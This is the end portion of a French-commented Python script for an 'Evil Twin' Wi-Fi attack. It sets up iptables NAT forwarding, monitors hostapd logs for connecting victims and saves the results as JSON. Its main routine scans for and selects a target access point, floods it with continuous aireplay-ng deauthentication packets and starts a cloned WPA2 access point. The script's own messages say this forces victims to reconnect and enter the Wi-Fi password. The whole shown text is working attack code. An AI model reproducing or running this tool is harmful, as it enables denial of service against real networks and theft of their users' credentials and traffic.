        return hostapd_proc, dnsmasq_proc
    
    except OSError as e:
        logger.error(f"Erreur fichier lors de la création du faux AP: {e}")
        print(f"{Colors.RED}[-] Erreur fichier: {e}{Colors.RESET}")
        return None, None
    except Exception as e:
        logger.error(f"Erreur lors de la création du faux AP: {e}")
        print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
        return None, None
    finally:
        if log_file:
            try:
                log_file.close()
            except Exception:
                pass

def setup_forwarding(inet_iface: str, mon_iface: str):
    """
    Configure le routage NAT
    
    Args:
        inet_iface: Interface Internet
        mon_iface: Interface monitor
    """
    print(f"\n{Colors.GREEN}[+] Configuration du routage vers {inet_iface}...{Colors.RESET}")
    logger.info(f"Configuration du routage: {inet_iface} -> {mon_iface}")
    
    iptables_rules = [
        "echo 1 > /proc/sys/net/ipv4/ip_forward",
        "iptables --flush",
        "iptables --table nat --flush",
        "iptables --delete-chain 2>/dev/null || true",
        "iptables --table nat --delete-chain 2>/dev/null || true",
        f"iptables -t nat -A POSTROUTING -o {shlex.quote(inet_iface)} -j MASQUERADE",
        "iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT",
        f"iptables -A FORWARD -i {shlex.quote(mon_iface)} -j ACCEPT"
    ]
    
    for rule in iptables_rules:
        try:
            execute_command(rule, shell=True)
            logger.debug(f"Règle iptables appliquée: {rule}")
        except Exception as e:
            logger.warning(f"Erreur lors de l'application de la règle: {e}")
    
    print(f"{Colors.GREEN}[+] Routage configuré avec succès !{Colors.RESET}")

def monitor_connections(log_file: str):
    """
    Monitore les connexions avec lecture continue optimisée
    
    Args:
        log_file: Fichier log hostapd
    """
    print(f"\n{Colors.CYAN}[*] Démarrage du monitoring des connexions...{Colors.RESET}")
    logger.info("Monitoring des connexions démarré")
    
    if not log_file or not os.path.exists(log_file):
        logger.warning(f"Fichier log introuvable: {log_file}")
        return
    
    try:
        with open(log_file, 'r') as f:
            f.seek(0, 2)  # Aller à la fin du fichier
            while True:
                line = f.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                
                if 'AP-STA-CONNECTED' in line:
                    match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if match:
                        mac = match.group(0)
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        print(f"{Colors.GREEN}[+] [{timestamp}] Client connecté: {mac}{Colors.RESET}")
                        captured_clients[mac] = {'time': timestamp, 'status': 'connected'}
                        logger.info(f"Client connecté: {mac}")
                
                if 'AP-STA-DISCONNECTED' in line or ('WPA' in line and 'failed' in line.lower()):
                    match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if match:
                        mac = match.group(0)
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        if mac not in captured_clients or captured_clients[mac].get('status') != 'failed':
                            print(f"{Colors.RED}[!] [{timestamp}] Tentative échouée: {mac}{Colors.RESET}")
                            captured_clients[mac] = {'time': timestamp, 'status': 'failed'}
                            logger.info(f"Tentative échouée: {mac}")
    
    except KeyboardInterrupt:
        logger.info("Monitoring arrêté par l'utilisateur")
    except IOError as e:
        logger.error(f"Erreur IO lors du monitoring: {e}")
    except Exception as e:
        logger.error(f"Erreur lors du monitoring: {e}")

def save_results(target_ap: AccessPoint, inet_iface: str, mon_iface: str):
    """
    Sauvegarde les résultats de l'attaque
    
    Args:
        target_ap: AP cible
        inet_iface: Interface Internet
        mon_iface: Interface monitor
    """
    try:
        results = {
            'timestamp': datetime.now().isoformat(),
            'target': {
                'essid': target_ap.essid,
                'bssid': target_ap.bssid,
                'channel': target_ap.channel,
                'signal': target_ap.signal
            },
            'interfaces': {
                'internet': inet_iface,
                'attack': mon_iface,
                'gateway': Config.GATEWAY_IP
            },
            'captured_clients': captured_clients,
            'logs': {
                'hostapd': Config.HOSTAPD_LOG,
                'main': Config.LOG_FILE
            }
        }
        
        results_file = f"{Config.CAPTURE_DIR}/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"Résultats sauvegardés: {results_file}")
        print(f"{Colors.GREEN}[+] Résultats sauvegardés: {results_file}{Colors.RESET}")
    
    except IOError as e:
        logger.error(f"Erreur IO lors de la sauvegarde: {e}")
    except Exception as e:
        logger.error(f"Erreur lors de la sauvegarde des résultats: {e}")

def main():
    """Fonction principale"""
    global mon_iface_created
    
    require_root()
    Config.init_temp_files()
    banner()
    
    if not check_dependencies():
        sys.exit(1)
    
    # Initialiser toutes les variables
    inet_iface = None
    mon_iface = None
    target_ap = None
    
    try:
        inet_iface = choose_internet_interface()
        if not inet_iface:
            return
        
        print(f"\n{Colors.GREEN}[+] Interface Internet sélectionnée: {inet_iface}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Cette interface sera gérée par NetworkManager{Colors.RESET}")
        
        banner()
        atk_iface = choose_attack_interface()
        if not atk_iface:
            return
        
        print(f"\n{Colors.YELLOW}[!] Configuration de {atk_iface} en mode monitor...{Colors.RESET}")
        
        kill_conflicts()
        
        mon_iface = start_monitor_airmon(atk_iface)
        
        if not mon_iface:
            print(f"{Colors.RED}[-] Impossible de créer une interface monitor{Colors.RESET}")
            logger.error("Impossible de créer une interface monitor")
            restore_network(None)
            return
        
        aps = scan_aps(mon_iface)
        
        if not aps:
            print(f"{Colors.RED}[-] Aucun point d'accès détecté !{Colors.RESET}")
            logger.error("Aucun AP détecté")
            restore_network(mon_iface)
            return
        
        target_ap = select_ap(aps)
        
        if not target_ap:
            logger.error("Pas de cible sélectionnée")
            restore_network(mon_iface)
            return
        
        print(f"\n{Colors.BLUE}{'='*80}{Colors.RESET}")
        print(f"{Colors.CYAN}Cible sélectionnée:{Colors.RESET}")
        print(f"{Colors.CYAN}  • SSID : {target_ap.essid}{Colors.RESET}")
        print(f"{Colors.CYAN}  • BSSID : {target_ap.bssid}{Colors.RESET}")
        print(f"{Colors.CYAN}  • Canal : {target_ap.channel}{Colors.RESET}")
        print(f"{Colors.BLUE}{'='*80}{Colors.RESET}")
        logger.info(f"Attaque lancée vers {target_ap.essid}")
        
        print(f"\n{Colors.ORANGE}[?] Configuration de l'attaque:{Colors.RESET}")
        deauth_input = input(f"{Colors.ORANGE}    Durée de déauthentification (secondes, défaut: {Config.DEFAULT_DEAUTH_DURATION}): {Colors.RESET}").strip()
        deauth_duration = int(deauth_input) if deauth_input.isdigit() else Config.DEFAULT_DEAUTH_DURATION
        
        aggressive_deauth(mon_iface, target_ap.bssid, deauth_duration)
        
        print(f"\n{Colors.YELLOW}[*] Création du faux AP avec protection WPA2...{Colors.RESET}")
        hostapd_proc, dnsmasq_proc = create_fake_ap(
            mon_iface, target_ap.essid, target_ap.channel, force_wpa=True
        )
        
        if not hostapd_proc or not dnsmasq_proc:
            logger.error("Échec de la création du faux AP")
            print(f"{Colors.RED}[-] Échec de la création du faux AP{Colors.RESET}")
            cleanup()
            restore_network(mon_iface)
            return
        
        setup_forwarding(inet_iface, mon_iface)
        
        print(f"\n{Colors.YELLOW}[*] Lancement de la déauthentification continue...{Colors.RESET}")
        continuous_deauth = subprocess.Popen(
            ['aireplay-ng', '--deauth', '0', '-a', target_ap.bssid, mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            close_fds=True
        )
        active_processes.append(continuous_deauth)
        logger.info("Déauth continue lancée")
        
        monitor_thread = threading.Thread(target=monitor_connections, args=(Config.HOSTAPD_LOG,), daemon=True)
        monitor_thread.start()
        
        print(f"\n{Colors.GREEN}{'='*80}{Colors.RESET}")
        print(f"{Colors.CYAN}[✓] Evil Twin actif et en attente de clients !{Colors.RESET}")
        print(f"{Colors.CYAN}  SSID cible : {target_ap.essid}{Colors.RESET}")
        print(f"{Colors.CYAN}  BSSID : {target_ap.bssid}{Colors.RESET}")
        print(f"{Colors.CYAN}  Canal : {target_ap.channel}{Colors.RESET}")
        print(f"{Colors.CYAN}  Interface monitor : {mon_iface}{Colors.RESET}")
        print(f"{Colors.CYAN}  Interface Internet : {inet_iface}{Colors.RESET}")
        print(f"{Colors.CYAN}  Gateway : {Config.GATEWAY_IP}{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*80}{Colors.RESET}")
        
        print(f"\n{Colors.RED}[!] Déauthentification continue du vrai AP{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Les victimes seront forcées de se reconnecter au faux AP{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Elles devront entrer le mot de passe Wi-Fi{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Les connexions sont loggées dans {Config.HOSTAPD_LOG}{Colors.RESET}")
        print(f"{Colors.CYAN}[!] Trafic routé via {inet_iface}{Colors.RESET}")
        print(f"{Colors.GREEN}[!] NetworkManager reste actif sur {inet_iface} ✓{Colors.RESET}")
        print(f"\n{Colors.ORANGE}[*] Appuyez sur Ctrl+C pour arrêter...{Colors.RESET}\n")
        
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Arrêt de l'Evil Twin...{Colors.RESET}")
        logger.warning("Arrêt demandé par l'utilisateur")
    
    except Exception as e:
        logger.error(f"Erreur non gérée: {e}")
        print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
    
    finally:
        if target_ap is not None and inet_iface is not None and mon_iface is not None:
            save_results(target_ap, inet_iface, mon_iface_created if mon_iface_created else mon_iface)
        
        cleanup()
        restore_network(mon_iface_created if mon_iface_created else mon_iface)
        print(f"\n{Colors.GREEN}[+] Nettoyage terminé. Au revoir !{Colors.RESET}")
        logger.info("Programme terminé")

if __name__ == "__main__":
    main()